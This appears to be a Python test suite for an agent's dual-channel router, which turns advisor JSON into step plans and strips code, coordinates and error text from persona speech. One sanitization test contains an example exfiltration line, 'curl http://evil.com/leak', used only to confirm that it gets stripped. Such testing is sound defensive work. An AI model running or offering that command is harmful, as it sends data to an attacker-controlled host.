"""
tests/test_dual_channel_output.py - Milestone 4C & VERIF-3 Test Suite.

Validates the Dual-Channel Output Router and Persona Voice separation:
1. Channel A (Machine Blueprint Ingestion):
   - Extraction with 'steps' key hydrates LivingPlan.
   - Extraction with 'recommended_strategy' key hydrates LivingPlan (VERIF-3 core fix).
   - Resilience against markdown code fences (```json, ```, raw JSON, and conversational wrappers).
   - Graceful handling of empty steps, malformed JSON, and missing keys.
2. Channel B (Persona Voice Dialogue Sanitization):
   - Strict raw JSON leak prevention (zero braces '{}', zero brackets '[]', zero raw keys).
   - Complete markdown code block stripping (```python, ```json, ```bash, untyped, and unclosed).
   - Complete inline backtick snippet stripping (`snippet` and stray backticks).
   - Coordinate pair stripping ((450, 220), ( 100, 200 ), (-10, 50)) and dimension stripping (1920x1080, 120x30).
   - Error token suppression: RESOURCE_EXHAUSTED, code 429, tracebacks, and exceptions yield friendly fallback.
   - Persona speech generation rules (first step suggestion, modal detection, clean rationale, friendly fallback).
3. UIBridge.notify_speech() Integration:
   - Emits strictly sanitized character speech without leaking Channel A payload.
   - Graceful handling of None bridge or missing notify_speech method.
4. DualMindPipeline Integration:
   - Tier 2 strategic consultation routes through DualChannelRouter.
   - Elimination of legacy 'Web AI advises: ...' leak during OFFLOAD_WEB_AI actions.
"""

from __future__ import annotations

import json
from unittest.mock import MagicMock
import numpy as np
import pytest

from parasite_ai.mind.dual_mind import (
    ActionResult,
    DualChannelRouter,
    DualMindPipeline,
)
from parasite_ai.mind.memory import (
    ActionPlan,
    ActionType,
    CadenceTier,
    EpisodicMemory,
)
from parasite_ai.mind.plan import LivingPlan, PlanStep, StepIntent, StepStatus
from parasite_ai.ui.types import UIElement


# ===========================================================================
# 1. Channel A: Machine LivingPlan Blueprint Ingestion
# ===========================================================================

class TestChannelABlueprintIngestion:
    """Verifies Channel A extracts and hydrates LivingPlan from advisor responses."""

    def test_channel_a_extraction_with_steps_key(self):
        """Verifies LivingPlan hydration when advisor response uses 'steps' key."""
        router = DualChannelRouter()
        advisor_payload = """```json
{
  "rationale": "Navigate to the search bar and input query.",
  "recommended_strategy": "Direct search flow",
  "steps": [
    {
      "step_id": 1,
      "intent": "NAVIGATE",
      "description": "Click search input field",
      "target_description": "Search Box",
      "success_criteria": "Search box holds caret focus",
      "contingency": "Click search icon directly"
    },
    {
      "step_id": 2,
      "intent": "INPUT_DATA",
      "description": "Type search term and submit",
      "success_criteria": "Results list populated"
    }
  ]
}
```"""
        user_goal = "Search for quarterly reports"
        plan, speech = router.route_consultation_output(
            raw_advisor_text=advisor_payload,
            user_goal=user_goal,
            active_plan=None,
        )

        assert plan is not None, "Channel A must hydrate a valid LivingPlan"
        assert isinstance(plan, LivingPlan)
        assert plan.user_goal == user_goal
        assert len(plan.steps) == 2

        # Step 1 verification
        step1 = plan.steps[0]
        assert step1.step_id == 1
        assert step1.intent == StepIntent.NAVIGATE
        assert step1.description == "Click search input field"
        assert step1.target_description == "Search Box"
        assert step1.success_criteria == "Search box holds caret focus"
        assert step1.contingency == "Click search icon directly"
        assert step1.status == StepStatus.IN_PROGRESS

        # Step 2 verification
        step2 = plan.steps[1]
        assert step2.step_id == 2
        assert step2.intent == StepIntent.INPUT_DATA
        assert step2.status == StepStatus.PENDING

    def test_channel_a_extraction_with_recommended_strategy_key(self):
        """
        VERIF-3 Pass Criteria: Verifies LivingPlan hydration when advisor response
        uses 'recommended_strategy' key instead of 'steps'.
        """
        router = DualChannelRouter()
        advisor_payload = """```json
{
  "rationale": "A blocking confirmation dialog appeared.",
  "recommended_strategy": [
    {
      "step_id": 1,
      "intent": "DISMISS_DIALOG",
      "description": "Press Escape to close modal dialog",
      "success_criteria": "Dialog is closed and focus restored to main window",
      "contingency": "Click Close X button in dialog corner"
    }
  ]
}
```"""
        user_goal = "Dismiss blocking modal dialog"
        plan, speech = router.route_consultation_output(
            raw_advisor_text=advisor_payload,
            user_goal=user_goal,
            active_plan=None,
        )

        assert plan is not None, "VERIF-3 Invariant: Blueprint must NOT be dropped when using 'recommended_strategy'"
        assert isinstance(plan, LivingPlan)
        assert len(plan.steps) == 1
        assert plan.steps[0].intent == StepIntent.DISMISS_DIALOG
        assert plan.steps[0].description == "Press Escape to close modal dialog"
        assert plan.steps[0].contingency == "Click Close X button in dialog corner"

    def test_channel_a_extraction_raw_json_without_markdown_fences(self):
        """Verifies extraction when advisor returns raw JSON without markdown code fences."""
        router = DualChannelRouter()
        raw_json = json.dumps({
            "rationale": "Direct button click",
            "steps": [
                {
                    "step_id": 1,
                    "intent": "NAVIGATE",
                    "description": "Click the OK button",
                    "success_criteria": "Window closes",
                }
            ],
        })
        plan, speech = router.route_consultation_output(
            raw_advisor_text=raw_json,
            user_goal="Confirm dialog",
        )
        assert plan is not None
        assert len(plan.steps) == 1
        assert plan.steps[0].description == "Click the OK button"

    def test_channel_a_extraction_with_untyped_fences_and_commentary(self):
        """Verifies extraction with untyped ``` fences and conversational preamble/postscript."""
        router = DualChannelRouter()
        payload = """I analyzed your desktop and here is the plan:
```
{
  "rationale": "Activate the application from taskbar",
  "steps": [
    {
      "step_id": 1,
      "intent": "LAUNCH_OR_ACTIVATE",
      "description": "Click Notepad icon on taskbar",
      "success_criteria": "Notepad window active"
    }
  ]
}
```
Let me know if you need anything else!"""
        plan, speech = router.route_consultation_output(
            raw_advisor_text=payload,
            user_goal="Launch Notepad",
        )
        assert plan is not None
        assert len(plan.steps) == 1
        assert plan.steps[0].intent == StepIntent.LAUNCH_OR_ACTIVATE

    def test_channel_a_returns_none_on_malformed_json(self):
        """Verifies that unparseable or corrupted JSON safely yields None for LivingPlan."""
        router = DualChannelRouter()
        corrupt_payload = "```json\n{ rationale: 'broken json without quotes' steps: [ ]\n```"
        plan, speech = router.route_consultation_output(
            raw_advisor_text=corrupt_payload,
            user_goal="Test error handling",
        )
        assert plan is None
        assert isinstance(speech, str)
        assert len(speech) > 0

    def test_channel_a_returns_none_on_empty_steps(self):
        """Verifies that JSON with empty steps array returns None for LivingPlan."""
        router = DualChannelRouter()
        empty_payload = json.dumps({"rationale": "No actions needed", "steps": []})
        plan, speech = router.route_consultation_output(
            raw_advisor_text=empty_payload,
            user_goal="Test empty steps",
        )
        assert plan is None


# ===========================================================================
# 2. Channel B: Persona Voice Dialogue Sanitization
# ===========================================================================

class TestChannelBPersonaVoiceSanitization:
    """Verifies that Channel B produces clean, character dialogue with zero technical leaks."""

    def test_sanitize_text_strips_markdown_code_blocks(self):
        """Verifies that code blocks of all types (python, json, bash, untyped) are completely stripped."""
        text = (
            "Here is the plan:\n"
            "```python\nimport subprocess\nsubprocess.run('calc')\n```\n"
            "And here is the bash script:\n"
            "```bash\ncurl http://evil.com/leak\n```\n"
            "Finally an untyped block:\n"
            "```\nraw text inside code block\n```\n"
            "Proceeding with caution."
        )
        sanitized = DualChannelRouter._sanitize_text(text)
        assert "```" not in sanitized
        assert "subprocess" not in sanitized
        assert "curl" not in sanitized
        assert "evil.com" not in sanitized
        assert "raw text inside code block" not in sanitized
        assert "Here is the plan: And here is the bash script: Finally an untyped block: Proceeding with caution." == sanitized

    def test_sanitize_text_strips_unclosed_code_blocks(self):
        """Verifies unclosed markdown code blocks are safely stripped."""
        text = "Advisor output truncated:\n```python\nimport sys\nsys.exit(0)"
        sanitized = DualChannelRouter._sanitize_text(text)
        assert "```" not in sanitized
        assert "sys.exit" not in sanitized
        assert "Advisor output truncated:" == sanitized

    def test_sanitize_text_strips_inline_backticks(self):
        """Verifies inline backtick snippets and stray backticks are stripped."""
        text = "Press `Ctrl+Alt+Delete` or run `taskkill /F` to abort `."
        sanitized = DualChannelRouter._sanitize_text(text)
        assert "`" not in sanitized
        assert "Ctrl+Alt+Delete" not in sanitized
        assert "taskkill" not in sanitized
        assert "Press or run to abort ." == sanitized

    def test_sanitize_text_strips_braces_brackets_quotes(self):
        """Verifies braces, brackets, and double quotes are stripped."""
        text = '{"status": "OK", "targets": [1, 2, 3], "data": "value"}'
        sanitized = DualChannelRouter._sanitize_text(text)
        for char in ("{", "}", "[", "]", '"'):
            assert char not in sanitized, f"Character '{char}' must be stripped"
        assert "status: OK, targets: 1, 2, 3, data: value" == sanitized

    def test_sanitize_text_strips_coordinates_and_dimensions(self):
        """Verifies coordinate tuples and resolution dimensions are stripped."""
        text = (
            "Click at coordinates (450, 220) on 1920x1080 display. "
            "Also check (-10, 50) and ( 0 , 0 ) on 3840x1080 desktop with 120x30 bounding box."
        )
        sanitized = DualChannelRouter._sanitize_text(text)
        # Coordinate checks
        assert "(450, 220)" not in sanitized
        assert "(-10, 50)" not in sanitized
        assert "( 0 , 0 )" not in sanitized
        # Dimension checks
        assert "1920x1080" not in sanitized
        assert "3840x1080" not in sanitized
        assert "120x30" not in sanitized
        assert "(450" not in sanitized
        assert "220)" not in sanitized

    def test_translate_to_persona_voice_suppresses_raw_json_error_payload(self):
        """
        ADVERSARIAL STRESS: Verifies that when Gemini returns raw error JSON,
        zero raw error tokens or JSON structures leak to persona speech.
        """
        router = DualChannelRouter()
        raw_error = '{"error": "RESOURCE_EXHAUSTED", "code": 429, "message": "Rate limit exceeded"}'
        plan, speech = router.route_consultation_output(
            raw_advisor_text=raw_error,
            user_goal="Refactor code",
            active_plan=None,
        )

        assert plan is None
        assert "RESOURCE_EXHAUSTED" not in speech
        assert "429" not in speech
        assert "Rate limit" not in speech
        assert "error" not in speech.lower()
        assert "{" not in speech and "}" not in speech
        assert speech == "I've re-evaluated our plan. Moving to the next step now!"

    def test_translate_to_persona_voice_suppresses_stack_traces(self):
        """Verifies Python stack traces are suppressed with friendly character fallback."""
        router = DualChannelRouter()
        stack_trace = """Traceback (most recent call last):
  File "advisor.py", line 42, in consult
    raise RuntimeError("Model timeout")
RuntimeError: Model timeout"""
        speech = router.translate_to_persona_voice(
            raw_rationale=stack_trace,
            updated_plan=None,
            user_goal="Open window",
        )
        assert "Traceback" not in speech
        assert "RuntimeError" not in speech
        assert "advisor.py" not in speech
        assert speech == "I've re-evaluated our plan. Moving to the next step now!"

    def test_translate_to_persona_voice_with_modal_dialog_rationale(self):
        """Verifies character dialogue recognizes modal dialog scenarios without technical dumps."""
        router = DualChannelRouter()
        rationale = "Click failed because an unexpected modal dialog is blocking window focus."
        speech = router.translate_to_persona_voice(
            raw_rationale=rationale,
            updated_plan=None,
            user_goal="Submit form",
        )
        assert speech == "Looks like an unexpected dialog popped up. Let me dismiss it so we can keep going."

    def test_translate_to_persona_voice_with_hydrated_plan(self):
        """Verifies character dialogue references the first step when a LivingPlan is hydrated."""
        router = DualChannelRouter()
        plan = LivingPlan(
            user_goal="Close window",
            steps=[
                PlanStep(
                    step_id=1,
                    intent=StepIntent.NAVIGATE,
                    description="Click File menu item",
                    success_criteria="Menu opens",
                )
            ],
        )
        speech = router.translate_to_persona_voice(
            raw_rationale="File menu navigation required.",
            updated_plan=plan,
            user_goal="Close window",
        )
        assert "Gemini suggested we try click file menu item. Let's give that a shot!" == speech

    def test_translate_to_persona_voice_truncates_long_clean_rationale(self):
        """Verifies clean rationale is truncated to <= 140 characters."""
        router = DualChannelRouter()
        long_rationale = (
            "We should proceed by inspecting the current desktop layout very carefully to ensure "
            "that every single element has been thoroughly verified and no overlapping windows are "
            "interfering with our desired application window."
        )
        speech = router.translate_to_persona_voice(
            raw_rationale=long_rationale,
            updated_plan=None,
            user_goal="Inspect desktop",
        )
        assert len(speech) <= 140
        assert speech.startswith("We should proceed by inspecting")


# ===========================================================================
# 3. UIBridge Integration
# ===========================================================================

class TestUIBridgeIntegration:
    """Verifies that DualChannelRouter dispatches strictly sanitized speech to UIBridge."""

    def test_bridge_receives_sanitized_speech_on_consultation(self):
        mock_bridge = MagicMock()
        router = DualChannelRouter(bridge=mock_bridge)

        advisor_text = """```json
{
  "rationale": "Clicking button at (450, 220) with size 120x30",
  "steps": [
    {
      "step_id": 1,
      "intent": "NAVIGATE",
      "description": "Click OK button",
      "success_criteria": "OK clicked"
    }
  ]
}
```"""
        plan, speech = router.route_consultation_output(
            raw_advisor_text=advisor_text,
            user_goal="Click OK",
        )

        mock_bridge.notify_speech.assert_called_once_with(speech)
        assert "Gemini suggested we try click ok button. Let's give that a shot!" == speech
        assert "(450, 220)" not in speech
        assert "120x30" not in speech
        assert "```" not in speech

    def test_bridge_receives_friendly_fallback_on_error(self):
        mock_bridge = MagicMock()
        router = DualChannelRouter(bridge=mock_bridge)

        error_json = '{"error": "RESOURCE_EXHAUSTED", "code": 429}'
        plan, speech = router.route_consultation_output(
            raw_advisor_text=error_json,
            user_goal="Perform task",
        )

        mock_bridge.notify_speech.assert_called_once_with(
            "I've re-evaluated our plan. Moving to the next step now!"
        )
        assert plan is None

    def test_router_handles_none_bridge_safely(self):
        router = DualChannelRouter(bridge=None)
        advisor_text = json.dumps({
            "rationale": "Simple step",
            "steps": [
                {
                    "step_id": 1,
                    "intent": "NAVIGATE",
                    "description": "Simple action",
                    "success_criteria": "Done",
                }
            ],
        })
        plan, speech = router.route_consultation_output(
            raw_advisor_text=advisor_text,
            user_goal="Test",
        )
        assert plan is not None
        assert "simple action" in speech.lower()


# ===========================================================================
# 4. DualMindPipeline Integration & Legacy Leak Eradication
# ===========================================================================

class TestDualMindPipelineDualChannelIntegration:
    """Verifies end-to-end integration of DualChannelRouter in DualMindPipeline."""

    def test_tier_2_consultation_uses_dual_channel_router_steps_key(self):
        mock_brain = MagicMock()
        mock_mouse = MagicMock()
        mock_mouse.click.return_value = True
        mock_bridge = MagicMock()

        mock_offloader = MagicMock()
        mock_offloader.query_web_ai.return_value = json.dumps({
            "rationale": "Advisor strategy blueprint",
            "steps": [
                {
                    "step_id": 1,
                    "intent": "NAVIGATE",
                    "description": "Guided action step 1",
                    "success_criteria": "Step 1 complete",
                }
            ],
        })

        pipeline = DualMindPipeline(
            brain_manager=mock_brain,
            mouse_driver=mock_mouse,
            bridge=mock_bridge,
            offloader=mock_offloader,
        )

        # Place pipeline into Tier 2 (consultation mode)
        pipeline.escalation_sm.current_tier = CadenceTier.TIER_2_CONSULT
        pipeline.escalation_sm.local_strikes = 2

        elements = [UIElement.from_bbox(1, (10, 10, 50, 30), label="TargetBtn", role="Button")]
        frame = np.zeros((100, 100, 3), dtype=np.uint8)

        rec = pipeline.step(user_goal="Test Cadence", screen_frame=frame, grounded_elements=elements)

        assert rec.action.action == ActionType.WAIT
        assert rec.success is True
        assert pipeline.escalation_sm.current_tier == CadenceTier.TIER_3_GUIDED
        assert pipeline.active_plan is not None
        assert len(pipeline.active_plan.steps) == 1
        assert pipeline.active_plan.steps[0].description == "Guided action step 1"

        # Verify speech sent to bridge
        mock_bridge.notify_speech.assert_called_with(
            "Gemini suggested we try guided action step 1. Let's give that a shot!"
        )

    def test_tier_2_consultation_uses_dual_channel_router_recommended_strategy_key(self):
        """VERIF-3 Integration: Pipeline accepts blueprints with 'recommended_strategy' key."""
        mock_brain = MagicMock()
        mock_mouse = MagicMock()
        mock_bridge = MagicMock()

        mock_offloader = MagicMock()
        mock_offloader.query_web_ai.return_value = """```json
{
  "rationale": "Press Escape to clear popup dialog",
  "recommended_strategy": [
    {
      "step_id": 1,
      "intent": "DISMISS_DIALOG",
      "description": "Press Escape key",
      "success_criteria": "Popup dismissed"
    }
  ]
}
```"""

        pipeline = DualMindPipeline(
            brain_manager=mock_brain,
            mouse_driver=mock_mouse,
            bridge=mock_bridge,
            offloader=mock_offloader,
        )

        pipeline.escalation_sm.current_tier = CadenceTier.TIER_2_CONSULT
        pipeline.escalation_sm.local_strikes = 2

        rec = pipeline.step(user_goal="Clear popup")

        assert rec.success is True
        assert pipeline.escalation_sm.current_tier == CadenceTier.TIER_3_GUIDED
        assert pipeline.active_plan is not None
        assert len(pipeline.active_plan.steps) == 1
        assert pipeline.active_plan.steps[0].intent == StepIntent.DISMISS_DIALOG

        mock_bridge.notify_speech.assert_called_with(
            "Gemini suggested we try press escape key. Let's give that a shot!"
        )

    def test_pipeline_offload_web_ai_eradicates_legacy_leak(self):
        """
        Critical Invariant: Pass 2 OFFLOAD_WEB_AI action routes through DualChannelRouter
        and NEVER emits raw 'Web AI advises: ...' to speech or bridge.
        """
        mock_brain = MagicMock()
        mock_bridge = MagicMock()

        # Advisor returns raw payload containing code block and coordinate tuple
        mock_offloader = MagicMock()
        mock_offloader.query_web_ai.return_value = (
            "Here is the code at (450, 220):\n"
            "```python\nimport os\nos.system('calc')\n```\n"
            "```json\n{\"status\": \"FAILED\"}\n```"
        )

        pipeline = DualMindPipeline(
            brain_manager=mock_brain,
            bridge=mock_bridge,
            offloader=mock_offloader,
        )

        rec = pipeline.step(
            user_goal="Ask Web AI for advice",
            override_action=ActionPlan(action=ActionType.OFFLOAD_WEB_AI, reasoning="Offload to web advisor"),
        )

        assert rec.action.action == ActionType.OFFLOAD_WEB_AI
        assert rec.success is True

        # Assert legacy leak 'Web AI advises:' is completely absent
        assert not rec.persona_speech.startswith("Web AI advises:")
        assert "Web AI advises" not in rec.persona_speech

        # Assert no code blocks or coordinates in recorded persona speech
        assert "```" not in rec.persona_speech
        assert "(450, 220)" not in rec.persona_speech
        assert "import os" not in rec.persona_speech

        # Assert bridge only received sanitized speech
        for call in mock_bridge.notify_speech.call_args_list:
            speech_arg = call[0][0]
            assert not speech_arg.startswith("Web AI advises:")
            assert "```" not in speech_arg
            assert "(450, 220)" not in speech_arg
